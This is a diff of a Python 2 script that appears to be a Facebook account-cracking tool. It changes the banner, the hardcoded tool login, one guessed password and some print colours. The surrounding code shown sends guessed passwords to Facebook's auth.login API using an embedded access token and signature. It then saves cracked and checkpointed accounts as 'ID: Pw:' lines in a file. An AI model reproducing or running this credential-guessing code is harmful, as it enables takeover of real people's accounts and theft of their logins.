@@ -82,11 +82,17 @@ print  """
 \033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR KhAn BaBa💕 ~
 \033[1;93m************************************************
 
-\033[1;95m____─▄───────▄█▄───────▄─ Stay Home 💓
-\033[1;97m____▐█▌──▄──█████──▄──▐█▌ Stay Safe 💓
-\033[1;36m____─█──███▄▄███▄▄███──█─ 
-\033[1;37m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
-\033[1;46m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
+
+
+██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+██║░██╔╝██║░░██║██╔══██╗████╗░██║
+█████═╝░███████║███████║██╔██╗██║
+██╔═██╗░██╔══██║██╔══██║██║╚████║
+██║░╚██╗██║░░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+
+
+
 """
 jalan("\033[1;92m              _    _     _ ")             
 jalan("\033[1;92m             | |  (_)   | |")             
@@ -99,8 +105,8 @@ jalan("\033[1;92m |_| ")
 
 
 
-CorrectUsername = "khan"
-CorrectPassword = "khan"
+CorrectUsername = "pathan"
+CorrectPassword = "pathan"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -421,7 +427,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = 'Allah'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -500,10 +506,10 @@ def pilih_super():
 											                                       oks.append(user+pass9)
                                                                                                                        else:
 			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
-				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
+				                                                                                                   print '\x1b[1;93m[ ❥ ] \x1b[1;93mCheckpoint'
+				                                                                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;95m' + b['name']
+				                                                                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;95m' + user
+				                                                                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;95m' + pass9 + '\n'
 				                                                                                                   cek = open("out/super_cp.txt", "a")
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
